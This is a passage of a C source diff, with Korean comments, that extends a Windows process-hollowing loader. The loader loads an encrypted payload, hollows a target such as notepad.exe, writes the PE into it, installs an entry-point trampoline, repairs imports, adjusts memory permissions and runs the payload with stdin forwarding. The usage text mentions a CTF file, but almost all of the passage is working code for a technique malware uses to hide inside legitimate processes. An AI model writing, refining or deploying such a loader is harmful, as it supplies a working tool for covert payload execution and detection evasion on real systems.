+    // ChildStdInWrite 소유권을 worker에게 넘긴다.
+    *pChildStdInWrite = NULL;
+    *pForwardThread = thread;
+    printf("[*] Interactive stdin forwarding started\n");
+    return TRUE;
+}
+
+
+/* ---------------------------------------------------------------
  * Full process hollowing flow
  * --------------------------------------------------------------- */
-BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms) {
+BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage,
+    IN DWORD dwPeSize, IN OPTIONAL LPCSTR cProcessParms,
+    IN DWORD dwTimeoutMs) {
     PROCESS_INFORMATION   ProcessInfo          = { 0 };
     CONTEXT               Context              = { 0 };
     HANDLE                StdInWrite           = NULL;
+    HANDLE                StdInForwardThread   = NULL;
     HANDLE                StdOutRead           = NULL;
     PBYTE                 pRemoteAddress       = NULL;
+    PBYTE                 pRemoteGateState     = NULL;
+    ULONG_PTR             uOriginalEntryPoint  = 0;
+    ULONG_PTR             uPebImageBaseField   = 0;
+    ULONG_PTR             uPayloadEntryPoint   = 0;
     PIMAGE_NT_HEADERS     pImgNtHdrs           = NULL;
     PIMAGE_SECTION_HEADER pImgSecHdr           = NULL;
     SIZE_T                NumberOfBytesWritten = 0;
+    BOOL                  bThreadResumed       = FALSE;
     BOOL                  bSTATE               = FALSE;
 
-    if (!pPeBuffer || !cRemoteProcessImage)
+    if (!pPeBuffer || !cRemoteProcessImage ||
+        dwPeSize < sizeof(IMAGE_DOS_HEADER))
         return FALSE;
 
     printf("[*] Entering RemotePeExec\n");
@@ -674,12 +1395,48 @@ BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL
 
     printf("[*] Hollow process created\n");
 
-    pImgNtHdrs = (PIMAGE_NT_HEADERS)(
-        (ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
+    {
+        LONG ntOffset = ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew;
+        if (ntOffset <= 0 || (SIZE_T)ntOffset + sizeof(IMAGE_NT_HEADERS) >
+            dwPeSize) {
+            fprintf(stderr, "[!] Invalid NT header offset\n");
+            goto _CLEANUP;
+        }
+        pImgNtHdrs = (PIMAGE_NT_HEADERS)(
+            (ULONG_PTR)pPeBuffer + (SIZE_T)ntOffset);
+    }
 
     if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
         fprintf(stderr, "[!] Invalid NT Image Headers\n");
         goto _CLEANUP;
+    }
+    if (pImgNtHdrs->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
+        pImgNtHdrs->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
+        pImgNtHdrs->FileHeader.SizeOfOptionalHeader <
+            sizeof(IMAGE_OPTIONAL_HEADER64)) {
+        fprintf(stderr, "[-] Native hollowing path requires an x64 PE\n");
+        goto _CLEANUP;
+    }
+    if (!pImgNtHdrs->FileHeader.NumberOfSections ||
+        pImgNtHdrs->FileHeader.NumberOfSections > 96) {
+        fprintf(stderr, "[-] Invalid section count\n");
+        goto _CLEANUP;
+    }
+    {
+        SIZE_T sectionTableOffset =
+            (SIZE_T)((PBYTE)IMAGE_FIRST_SECTION(pImgNtHdrs) - pPeBuffer);
+        SIZE_T sectionTableSize =
+            (SIZE_T)pImgNtHdrs->FileHeader.NumberOfSections *
+            sizeof(IMAGE_SECTION_HEADER);
+        if (sectionTableOffset > dwPeSize ||
+            sectionTableSize > dwPeSize - sectionTableOffset ||
+            !pImgNtHdrs->OptionalHeader.SizeOfHeaders ||
+            pImgNtHdrs->OptionalHeader.SizeOfHeaders > dwPeSize ||
+            pImgNtHdrs->OptionalHeader.SizeOfHeaders >
+                pImgNtHdrs->OptionalHeader.SizeOfImage) {
+            fprintf(stderr, "[-] Invalid PE header/section bounds\n");
+            goto _CLEANUP;
+        }
     }
 
     printf("[*] ImageBase: 0x%p  SizeOfImage: 0x%lX\n",
@@ -724,6 +1481,15 @@ BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL
         if (pImgSecHdr[i].SizeOfRawData == 0)
             continue;
 
+        if ((ULONGLONG)pImgSecHdr[i].PointerToRawData +
+                pImgSecHdr[i].SizeOfRawData > dwPeSize ||
+            (ULONGLONG)pImgSecHdr[i].VirtualAddress +
+                pImgSecHdr[i].SizeOfRawData >
+                    pImgNtHdrs->OptionalHeader.SizeOfImage) {
+            fprintf(stderr, "[-] Section %u is outside PE bounds\n", i);
+            goto _CLEANUP;
+        }
+
         NumberOfBytesWritten = 0;
         if (!WriteProcessMemory(ProcessInfo.hProcess,
                                 pRemoteAddress + pImgSecHdr[i].VirtualAddress,
@@ -744,27 +1510,21 @@ BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL
         goto _CLEANUP;
     }
 
-    printf("[*] Thread context: RCX=0x%llX  RDX=0x%llX\n", Context.Rcx, Context.Rdx);
+    printf("[*] Thread context: RIP=0x%llX  RCX=0x%llX  RDX=0x%llX\n",
+           Context.Rip, Context.Rcx, Context.Rdx);
 
-    if (!ReplaceBaseAddressImage(ProcessInfo.hProcess,
-                                 (ULONG_PTR)pRemoteAddress,
-                                 (ULONG_PTR)Context.Rdx))
-        goto _CLEANUP;
+    uOriginalEntryPoint = (ULONG_PTR)Context.Rcx;
+    uPebImageBaseField = (ULONG_PTR)Context.Rdx +
+        offsetof(PEB, Reserved3[1]);
+    uPayloadEntryPoint = (ULONG_PTR)pRemoteAddress +
+        pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
 
-    Context.Rcx = (DWORD64)(
-        (ULONG_PTR)pRemoteAddress +
-        pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
-
-    printf("[*] Entry point set: 0x%llX\n", Context.Rcx);
-
-    if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
-        PRINT_WINAPI_ERR("SetThreadContext");
-        goto _CLEANUP;
-    }
-
-    if (!FixMemPermissionsEx(ProcessInfo.hProcess,
-                             (ULONG_PTR)pRemoteAddress,
-                             pImgNtHdrs, pImgSecHdr))
+    if (!InstallEntryPointTrampoline(ProcessInfo.hProcess,
+                                     uOriginalEntryPoint,
+                                     uPebImageBaseField,
+                                     (ULONG_PTR)pRemoteAddress,
+                                     uPayloadEntryPoint,
+                                     &pRemoteGateState))
         goto _CLEANUP;
 
     printf("[*] Resuming thread...\n");
@@ -773,29 +1533,102 @@ BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL
         PRINT_WINAPI_ERR("ResumeThread");
         goto _CLEANUP;
     }
+    bThreadResumed = TRUE;
 
-    // 데드락 방지: 폴링 방식으로 출력 수집 (500ms 간격, 최대 30초)
-    printf("[*] Reading output...\n");
+    if (!WaitForRemoteEntryGate(ProcessInfo.hProcess, StdOutRead,
+                                pRemoteGateState, 10000))
+        goto _CLEANUP;
+
+    if (!RepairRemoteIAT(ProcessInfo.hProcess, pPeBuffer, dwPeSize,
+                         pImgNtHdrs, (ULONG_PTR)pRemoteAddress))
+        goto _CLEANUP;
+
+    if (!FixMemPermissionsEx(ProcessInfo.hProcess,
+                             (ULONG_PTR)pRemoteAddress,
+                             pImgNtHdrs, pImgSecHdr))
+        goto _CLEANUP;
+
+    if (!StartStandardInputForwarder(&StdInWrite,
+                                     &StdInForwardThread))
+        goto _CLEANUP;
+
+    if (!ReleaseRemoteEntryGate(ProcessInfo.hProcess, pRemoteGateState))
+        goto _CLEANUP;
+
+    printf("[*] Reading output and waiting for process exit");
+    if (dwTimeoutMs == INFINITE)
+        printf(" (no timeout)...\n");
+    else
+        printf(" (timeout: %lu ms)...\n", dwTimeoutMs);
+
     {
-        DWORD dwWait    = WAIT_TIMEOUT;
-        DWORD dwTimeout = 30000;
+        const DWORD dwPollInterval = 100;
+        ULONGLONG ullStarted = GetTickCount64();
+        DWORD dwWait = WAIT_TIMEOUT;
+        DWORD dwExitCode = STILL_ACTIVE;
 
-        do {
+        for (;;) {
             PrintOutput(StdOutRead);
-            dwWait    = WaitForSingleObject(ProcessInfo.hProcess, 500);
-            dwTimeout = (dwTimeout >= 500) ? dwTimeout - 500 : 0;
-        } while (dwWait == WAIT_TIMEOUT && dwTimeout > 0);
 
-        // 마지막 남은 출력 비우기
+            dwWait = WaitForSingleObject(ProcessInfo.hProcess, dwPollInterval);
+            if (dwWait == WAIT_OBJECT_0)
+                break;
+            if (dwWait == WAIT_FAILED) {
+                PRINT_WINAPI_ERR("WaitForSingleObject");
+                goto _CLEANUP;
+            }
+
+            if (dwTimeoutMs != INFINITE &&
+                GetTickCount64() - ullStarted >= dwTimeoutMs) {
+                fprintf(stderr,
+                        "[!] Timeout after %lu ms - PID %lu is still running\n",
+                        dwTimeoutMs, ProcessInfo.dwProcessId);
+                SetLastError(ERROR_TIMEOUT);
+                goto _CLEANUP;
+            }
+        }
+
+        // 프로세스 종료 직후 pipe에 남은 출력까지 모두 비운다.
         PrintOutput(StdOutRead);
 
-        if (dwWait == WAIT_TIMEOUT)
-            printf("\n[!] Timeout - process still running or no output\n");
+        if (!GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode)) {
+            PRINT_WINAPI_ERR("GetExitCodeProcess");
+            goto _CLEANUP;
+        }
+
+        printf("[*] Hollowed process exited with code: 0x%08lX (%lu)\n",
+               dwExitCode, dwExitCode);
+
+        // 일반적인 unhandled exception NTSTATUS는 성공으로 보고하지 않는다.
+        if ((dwExitCode & 0xF0000000UL) == 0xC0000000UL) {
+            fprintf(stderr,
+                    "[-] Hollowed process terminated by exception: 0x%08lX\n",
+                    dwExitCode);
+            goto _CLEANUP;
+        }
     }
 
     bSTATE = TRUE;
 
 _CLEANUP:
+    if (!bSTATE && bThreadResumed && ProcessInfo.hProcess) {
+        DWORD exitCode = 0;
+        if (GetExitCodeProcess(ProcessInfo.hProcess, &exitCode) &&
+            exitCode == STILL_ACTIVE) {
+            TerminateProcess(ProcessInfo.hProcess, ERROR_PROCESS_ABORTED);
+            WaitForSingleObject(ProcessInfo.hProcess, 1000);
+            printf("[*] Failed/timeout child process terminated\n");
+        }
+    }
+    if (StdInForwardThread) {
+        // console ReadFile 등에서 대기 중인 input worker를 깨운다.
+        if (!CancelSynchronousIo(StdInForwardThread) &&
+            GetLastError() != ERROR_NOT_FOUND) {
+            PRINT_WINAPI_ERR("CancelSynchronousIo[stdin-forward]");
+        }
+        WaitForSingleObject(StdInForwardThread, 1000);
+    }
+    DELETE_HANDLE(StdInForwardThread);
     DELETE_HANDLE(StdInWrite);
     DELETE_HANDLE(StdOutRead);
     DELETE_HANDLE(ProcessInfo.hThread);
@@ -812,6 +1645,7 @@ int main(int argc, char* argv[]) {
     PBYTE  pBuffer        = NULL;
     DWORD  dwBufferSize   = 0;
     BOOL   bResult        = FALSE;
+    DWORD  dwNativeTimeoutMs = INFINITE;
     LPCSTR pPayloadPath   = NULL;
     LPCSTR pTargetProcess = NULL;
 
@@ -819,13 +1653,23 @@ int main(int argc, char* argv[]) {
 
     if (argc < 2) {
         fprintf(stderr, "Usage:   %s <encrypted_payload> [target_process]\n", argv[0]);
-        fprintf(stderr, "Native:  %s ctf.bin C:\\Windows\\System32\\notepad.exe\n", argv[0]);
+        fprintf(stderr, "Native:  %s ctf.bin C:\\Windows\\System32\\notepad.exe [timeout_ms]\n", argv[0]);
         fprintf(stderr, "Managed: %s managed.bin\n", argv[0]);
         return -1;
     }
 
     pPayloadPath   = argv[1];
     pTargetProcess = (argc >= 3) ? argv[2] : NULL;
+
+    if (argc >= 4) {
+        CHAR* end = NULL;
+        unsigned long parsed = strtoul(argv[3], &end, 10);
+        if (!end || *end != '\0') {
+            fprintf(stderr, "[-] Invalid timeout_ms: %s\n", argv[3]);
+            return -1;
+        }
+        dwNativeTimeoutMs = parsed == 0 ? INFINITE : (DWORD)parsed;
+    }
 
     printf("[*] Payload : %s\n", pPayloadPath);
     printf("[*] Target  : %s\n", pTargetProcess ? pTargetProcess : "(not supplied)");
@@ -860,22 +1704,10 @@ int main(int argc, char* argv[]) {
 
         if (!EnableDebugPrivilege()) {
             fprintf(stderr,
-                    "[!] Failed to enable SeDebugPrivilege - run as Administrator\n");
-            bResult = FALSE;
-            goto _CLEANUP;
+                    "[!] SeDebugPrivilege unavailable; continuing with the handle returned by CreateProcess\n");
         }
 
         printf("[*] Native PE detected - starting process hollowing\n");
-        bResult = RemotePeExec(pBuffer, pTargetProcess, PARMS);
+        bResult = RemotePeExec(pBuffer, pTargetProcess, dwBufferSize, PARMS,
+                               dwNativeTimeoutMs);
     }
-
-_CLEANUP:
-    HeapFree(GetProcessHeap(), 0, pBuffer);
-
-    if (bResult)
-        printf("[+] Execution succeeded\n");
-    else
-        fprintf(stderr, "[-] Execution failed\n");
-
-    return bResult ? 0 : -1;
-}
